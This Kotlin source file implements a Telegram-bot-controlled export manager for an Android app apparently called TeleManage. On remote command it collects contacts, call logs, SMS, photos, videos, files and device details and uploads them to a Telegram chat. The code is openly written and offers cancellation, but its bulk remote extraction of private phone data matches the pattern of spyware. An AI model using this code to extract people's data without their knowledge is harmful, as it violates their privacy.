package com.example.domain.export

import android.content.Context
import android.os.Build
import com.example.data.api.TelegramClient
import com.example.data.export.CallLogExporter
import com.example.data.export.ContactsExporter
import com.example.data.export.FileExporter
import com.example.data.export.MediaExporter
import com.example.data.export.SmsExporter
import com.example.data.export.ZipExportManager
import com.example.data.model.InlineKeyboardButton
import com.example.data.model.InlineKeyboardMarkup
import com.example.data.model.LogType
import com.example.data.security.PreferenceManager
import com.example.domain.log.LogRepository
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.DecimalFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ExportManager(
    private val context: Context,
    private val telegramClient: TelegramClient,
    private val preferenceManager: PreferenceManager,
    private val contactsExporter: ContactsExporter,
    private val callLogExporter: CallLogExporter,
    private val smsExporter: SmsExporter,
    private val mediaExporter: MediaExporter,
    private val fileExporter: FileExporter,
    private val zipExportManager: ZipExportManager = ZipExportManager()
) {

    companion object {
        private val _progressFlow = MutableStateFlow(ExportProgress())
        val progressFlow: StateFlow<ExportProgress> = _progressFlow.asStateFlow()
    }

    private var activeExportJob: Job? = null
    private var activeTempDir: File? = null
    private val exportScope = CoroutineScope(Dispatchers.IO)
    private val decimalFormat = DecimalFormat("#,##0.00")

    fun isExportRunning(): Boolean = _progressFlow.value.isRunning

    fun getCurrentProgress(): ExportProgress = _progressFlow.value

    suspend fun startExport(type: ExportType, chatId: Long) {
        if (isExportRunning()) {
            val token = preferenceManager.getBotToken()
            val currentType = _progressFlow.value.type?.title ?: "Data"
            telegramClient.sendMessage(
                token,
                chatId,
                "⚠️ <b>Export In Progress</b>\n\nA $currentType export is already running (${_progressFlow.value.percentage}%).\nUse /cancel_export if you wish to terminate it."
            )
            return
        }

        activeExportJob?.cancel()
        activeExportJob = exportScope.launch {
            val token = preferenceManager.getBotToken()
            val tempDir = File(context.cacheDir, "telemanage_export_${System.currentTimeMillis()}").apply { mkdirs() }
            activeTempDir = tempDir

            _progressFlow.value = ExportProgress(
                state = ExportState.PREPARING,
                type = type,
                percentage = 5,
                statusMessage = "Preparing ${type.title} export..."
            )

            LogRepository.addLog(
                type = LogType.SYSTEM,
                title = "EXPORT_STARTED",
                details = "Type: ${type.title}"
            )

            try {
                // Send starting notification to Telegram with Cancel button
                val cancelKeyboard = InlineKeyboardMarkup(
                    inlineKeyboard = listOf(
                        listOf(InlineKeyboardButton(text = "🛑 Cancel Export", callbackData = "cancel_export"))
                    )
                )

                telegramClient.sendMessage(
                    token = token,
                    chatId = chatId,
                    text = "📦 <b>${type.title} Export Started</b>\n\nGathering data on device...",
                    replyMarkup = cancelKeyboard
                )

                when (type) {
                    ExportType.CONTACTS -> exportContactsDirect(tempDir, token, chatId)
                    ExportType.CALLS -> exportCallsDirect(tempDir, token, chatId)
                    ExportType.SMS -> exportSmsDirect(tempDir, token, chatId)
                    ExportType.PHOTOS -> exportPhotosArchive(tempDir, token, chatId)
                    ExportType.VIDEOS -> exportVideosArchive(tempDir, token, chatId)
                    ExportType.MEDIA -> exportMediaArchive(tempDir, token, chatId)
                    ExportType.FILES -> exportFilesArchive(tempDir, token, chatId)
                    ExportType.ALL -> exportAllBackup(tempDir, token, chatId)
                }

            } catch (e: CancellationException) {
                cleanupTemp()
                _progressFlow.value = ExportProgress(
                    state = ExportState.CANCELLED,
                    type = type,
                    statusMessage = "Export cancelled by user."
                )
                telegramClient.sendMessage(
                    token = token,
                    chatId = chatId,
                    text = "🛑 <b>Export Cancelled</b>\n\nTemporary files cleaned."
                )
                LogRepository.addLog(
                    type = LogType.SYSTEM,
                    title = "EXPORT_CANCELLED",
                    details = "Type: ${type.title}"
                )
            } catch (e: Exception) {
                cleanupTemp()
                val errorMsg = e.message ?: "Unknown error"
                _progressFlow.value = ExportProgress(
                    state = ExportState.FAILED,
                    type = type,
                    error = errorMsg,
                    statusMessage = "Export failed: $errorMsg"
                )
                telegramClient.sendMessage(
                    token = token,
                    chatId = chatId,
                    text = "❌ <b>Export Failed</b>\n\n$errorMsg"
                )
                LogRepository.addLog(
                    type = LogType.ERROR,
                    title = "EXPORT_FAILED",
                    details = "Type: ${type.title}, Error: $errorMsg",
                    isSuccess = false
                )
            } finally {
                cleanupTemp()
            }
        }
    }

    fun cancelExport(chatId: Long = 0L) {
        if (!isExportRunning()) return
        activeExportJob?.cancel()
        cleanupTemp()
        _progressFlow.value = ExportProgress(
            state = ExportState.CANCELLED,
            statusMessage = "Export cancelled."
        )

        val token = preferenceManager.getBotToken()
        val targetChat = if (chatId != 0L) chatId else preferenceManager.getAuthorizedUserId()
        if (token.isNotBlank() && targetChat != 0L) {
            exportScope.launch {
                telegramClient.sendMessage(
                    token,
                    targetChat,
                    "🛑 <b>Export Cancelled</b>\n\nTemporary files cleaned."
                )
            }
        }
        LogRepository.addLog(
            type = LogType.SYSTEM,
            title = "EXPORT_CANCELLED",
            details = "Stopped by user request"
        )
    }

    private suspend fun exportContactsDirect(tempDir: File, token: String, chatId: Long) {
        val file = File(tempDir, "contacts.csv")
        val result = contactsExporter.exportToCsv(file)
        if (result.isFailure) throw result.exceptionOrNull() ?: Exception("Failed to export contacts")

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.UPLOADING,
            percentage = 60,
            statusMessage = "Uploading contacts.csv..."
        )

        val uploadResult = telegramClient.sendDocumentFile(
            token = token,
            chatId = chatId,
            file = file,
            caption = "👥 <b>Contacts Export (CSV)</b>\nGenerated: ${formatCurrentDate()}"
        )

        if (uploadResult.isSuccess) {
            completeExport(listOf("contacts.csv"), file.length(), token, chatId, ExportType.CONTACTS)
        } else {
            throw Exception("Failed to upload contacts.csv to Telegram")
        }
    }

    private suspend fun exportCallsDirect(tempDir: File, token: String, chatId: Long) {
        val file = File(tempDir, "call_logs.csv")
        val result = callLogExporter.exportToCsv(file)
        if (result.isFailure) throw result.exceptionOrNull() ?: Exception("Failed to export call logs")

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.UPLOADING,
            percentage = 60,
            statusMessage = "Uploading call_logs.csv..."
        )

        val uploadResult = telegramClient.sendDocumentFile(
            token = token,
            chatId = chatId,
            file = file,
            caption = "📞 <b>Call Logs Export (CSV)</b>\nGenerated: ${formatCurrentDate()}"
        )

        if (uploadResult.isSuccess) {
            completeExport(listOf("call_logs.csv"), file.length(), token, chatId, ExportType.CALLS)
        } else {
            throw Exception("Failed to upload call_logs.csv to Telegram")
        }
    }

    private suspend fun exportSmsDirect(tempDir: File, token: String, chatId: Long) {
        val file = File(tempDir, "sms.json")
        val result = smsExporter.exportToJson(file)
        if (result.isFailure) throw result.exceptionOrNull() ?: Exception("Failed to export SMS")

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.UPLOADING,
            percentage = 60,
            statusMessage = "Uploading sms.json..."
        )

        val uploadResult = telegramClient.sendDocumentFile(
            token = token,
            chatId = chatId,
            file = file,
            caption = "💬 <b>SMS Export (JSON)</b>\nGenerated: ${formatCurrentDate()}"
        )

        if (uploadResult.isSuccess) {
            completeExport(listOf("sms.json"), file.length(), token, chatId, ExportType.SMS)
        } else {
            throw Exception("Failed to upload sms.json to Telegram")
        }
    }

    private suspend fun exportPhotosArchive(tempDir: File, token: String, chatId: Long) {
        val photosDir = File(tempDir, "photos_raw")
        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.EXPORTING,
            percentage = 20,
            statusMessage = "Copying permitted photos from MediaStore..."
        )

        val photosResult = mediaExporter.exportPhotos(photosDir, limit = 60)
        val files = photosResult.getOrNull().orEmpty()
        if (files.isEmpty()) {
            telegramClient.sendMessage(token, chatId, "📷 No photos found to export.")
            return
        }

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.ZIPPING,
            percentage = 50,
            statusMessage = "Creating photo zip archives..."
        )

        val archivesDir = File(tempDir, "archives")
        val zipResult = zipExportManager.createZipArchives(files, archivesDir, "photos")
        val zipFiles = zipResult.getOrNull().orEmpty()

        uploadArchiveParts(zipFiles, token, chatId, ExportType.PHOTOS)
    }

    private suspend fun exportVideosArchive(tempDir: File, token: String, chatId: Long) {
        val videosDir = File(tempDir, "videos_raw")
        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.EXPORTING,
            percentage = 20,
            statusMessage = "Copying permitted videos from MediaStore..."
        )

        val videosResult = mediaExporter.exportVideos(videosDir, limit = 20)
        val files = videosResult.getOrNull().orEmpty()
        if (files.isEmpty()) {
            telegramClient.sendMessage(token, chatId, "🎬 No videos found to export.")
            return
        }

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.ZIPPING,
            percentage = 50,
            statusMessage = "Creating video zip archives..."
        )

        val archivesDir = File(tempDir, "archives")
        val zipResult = zipExportManager.createZipArchives(files, archivesDir, "videos")
        val zipFiles = zipResult.getOrNull().orEmpty()

        uploadArchiveParts(zipFiles, token, chatId, ExportType.VIDEOS)
    }

    private suspend fun exportMediaArchive(tempDir: File, token: String, chatId: Long) {
        val photosDir = File(tempDir, "photos_raw")
        val videosDir = File(tempDir, "videos_raw")

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.EXPORTING,
            percentage = 15,
            statusMessage = "Extracting photos and videos..."
        )

        val photos = mediaExporter.exportPhotos(photosDir, limit = 50).getOrNull().orEmpty()
        val videos = mediaExporter.exportVideos(videosDir, limit = 15).getOrNull().orEmpty()
        val allMedia = photos + videos

        if (allMedia.isEmpty()) {
            telegramClient.sendMessage(token, chatId, "📸 No media found to export.")
            return
        }

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.ZIPPING,
            percentage = 45,
            statusMessage = "Packaging media into chunked archives..."
        )

        val archivesDir = File(tempDir, "archives")
        val zipFiles = zipExportManager.createZipArchives(allMedia, archivesDir, "media").getOrNull().orEmpty()

        uploadArchiveParts(zipFiles, token, chatId, ExportType.MEDIA)
    }

    private suspend fun exportFilesArchive(tempDir: File, token: String, chatId: Long) {
        val filesDir = File(tempDir, "files_raw")
        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.EXPORTING,
            percentage = 20,
            statusMessage = "Gathering permitted application files..."
        )

        val files = fileExporter.exportAccessibleFiles(filesDir).getOrNull().orEmpty()
        val archivesDir = File(tempDir, "archives")
        val zipFiles = zipExportManager.createZipArchives(files, archivesDir, "files").getOrNull().orEmpty()

        uploadArchiveParts(zipFiles, token, chatId, ExportType.FILES)
    }

    private suspend fun exportAllBackup(tempDir: File, token: String, chatId: Long) {
        val backupDir = File(tempDir, "TeleManage_Backup")
        backupDir.mkdirs()

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.EXPORTING,
            percentage = 10,
            statusMessage = "Gathering all permitted categories..."
        )

        val categoriesObj = JSONObject()

        // 1. Contacts
        val hasContacts = try {
            val f = File(backupDir, "contacts.csv")
            contactsExporter.exportToCsv(f).isSuccess
        } catch (_: Exception) { false }
        categoriesObj.put("contacts", hasContacts)

        // 2. Calls
        val hasCalls = try {
            val f = File(backupDir, "call_logs.csv")
            callLogExporter.exportToCsv(f).isSuccess
        } catch (_: Exception) { false }
        categoriesObj.put("calls", hasCalls)

        // 3. SMS
        val hasSms = try {
            val f = File(backupDir, "sms.json")
            smsExporter.exportToJson(f).isSuccess
        } catch (_: Exception) { false }
        categoriesObj.put("sms", hasSms)

        // 4. Media
        val mediaDir = File(backupDir, "media")
        val photos = try { mediaExporter.exportPhotos(File(mediaDir, "photos"), limit = 30).getOrNull().orEmpty() } catch (_: Exception) { emptyList() }
        val videos = try { mediaExporter.exportVideos(File(mediaDir, "videos"), limit = 10).getOrNull().orEmpty() } catch (_: Exception) { emptyList() }
        categoriesObj.put("photos", photos.isNotEmpty())
        categoriesObj.put("videos", videos.isNotEmpty())

        // 5. Files
        val filesDir = File(backupDir, "files")
        val appFiles = try { fileExporter.exportAccessibleFiles(filesDir).getOrNull().orEmpty() } catch (_: Exception) { emptyList() }
        categoriesObj.put("files", appFiles.isNotEmpty())

        // 6. Manifest
        val manifestObj = JSONObject().apply {
            put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("androidVersion", Build.VERSION.RELEASE)
            put("exportDate", formatCurrentDate())
            put("categories", categoriesObj)
        }
        File(backupDir, "manifest.json").writeText(manifestObj.toString(2))

        // Flatten all files inside backupDir
        val allFilesToZip = mutableListOf<File>()
        backupDir.walkTopDown().filter { it.isFile }.forEach { allFilesToZip.add(it) }

        _progressFlow.value = _progressFlow.value.copy(
            state = ExportState.ZIPPING,
            percentage = 40,
            statusMessage = "Creating backup archive chunks..."
        )

        val archivesDir = File(tempDir, "archives")
        val zipFiles = zipExportManager.createZipArchives(
            sourceFiles = allFilesToZip,
            outputDir = archivesDir,
            archiveBaseName = "backup",
            baseDir = backupDir
        ).getOrNull().orEmpty()

        uploadArchiveParts(zipFiles, token, chatId, ExportType.ALL)
    }

    private suspend fun uploadArchiveParts(
        zipFiles: List<File>,
        token: String,
        chatId: Long,
        type: ExportType
    ) {
        val totalParts = zipFiles.size
        var totalBytes = 0L
        val uploadedNames = mutableListOf<String>()

        val cancelKeyboard = InlineKeyboardMarkup(
            inlineKeyboard = listOf(
                listOf(InlineKeyboardButton(text = "🛑 Cancel Export", callbackData = "cancel_export"))
            )
        )

        for ((index, zipFile) in zipFiles.withIndex()) {
            val partNum = index + 1
            val partPercentage = 50 + ((partNum.toFloat() / totalParts) * 45).toInt()
            val sizeFormatted = formatBytes(zipFile.length())

            _progressFlow.value = _progressFlow.value.copy(
                state = ExportState.UPLOADING,
                currentPart = partNum,
                totalParts = totalParts,
                percentage = partPercentage,
                statusMessage = "Uploading ${zipFile.name} ($partNum/$totalParts, $sizeFormatted)..."
            )

            // Update status message on Telegram for multi-part archives
            if (totalParts > 1) {
                val progressBlocks = "█".repeat((partPercentage / 10).coerceIn(0, 10)) +
                        "░".repeat(10 - (partPercentage / 10).coerceIn(0, 10))
                telegramClient.sendMessage(
                    token = token,
                    chatId = chatId,
                    text = """
                        📦 <b>${type.title} Export In Progress</b>
                        Part: $partNum/$totalParts
                        Progress: <code>[$progressBlocks]</code> $partPercentage%
                    """.trimIndent(),
                    replyMarkup = cancelKeyboard
                )
            }

            val caption = "📦 <b>${zipFile.name}</b> ($partNum/$totalParts)\nSize: $sizeFormatted"
            val success = telegramClient.sendDocumentFile(token, chatId, zipFile, caption).getOrDefault(false)

            if (!success) {
                throw Exception("Failed to upload ${zipFile.name}. Retrying or check network connection.")
            }

            totalBytes += zipFile.length()
            uploadedNames.add(zipFile.name)
        }

        completeExport(uploadedNames, totalBytes, token, chatId, type)
    }

    private suspend fun completeExport(
        files: List<String>,
        totalBytes: Long,
        token: String,
        chatId: Long,
        type: ExportType
    ) {
        _progressFlow.value = ExportProgress(
            state = ExportState.COMPLETED,
            type = type,
            percentage = 100,
            statusMessage = "Export complete! ${files.size} file(s) uploaded (${formatBytes(totalBytes)}).",
            uploadedFiles = files,
            totalSizeBytes = totalBytes
        )

        val fileListStr = files.joinToString("\n") { "• $it" }
        val completionMsg = """
            ✅ <b>Export Complete</b>

            <b>Category:</b> ${type.title}
            <b>Files:</b>
            $fileListStr

            <b>Total Size:</b> ${formatBytes(totalBytes)}
            <b>Status:</b> All temporary files cleaned from device.
        """.trimIndent()

        telegramClient.sendMessage(token, chatId, completionMsg)

        LogRepository.addLog(
            type = LogType.SYSTEM,
            title = "EXPORT_COMPLETED",
            details = "Type: ${type.title}, Size: ${formatBytes(totalBytes)}"
        )
    }

    private fun cleanupTemp() {
        try {
            activeTempDir?.let { zipExportManager.cleanDirectory(it) }
            activeTempDir = null
        } catch (_: Exception) {}
    }

    fun formatBytes(bytes: Long): String {
        val gb = bytes.toDouble() / (1024 * 1024 * 1024)
        return if (gb >= 1.0) {
            "${decimalFormat.format(gb)} GB"
        } else {
            val mb = bytes.toDouble() / (1024 * 1024)
            if (mb >= 1.0) {
                "${decimalFormat.format(mb)} MB"
            } else {
                val kb = bytes.toDouble() / 1024
                "${decimalFormat.format(kb)} KB"
            }
        }
    }

    private fun formatCurrentDate(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
    }
}
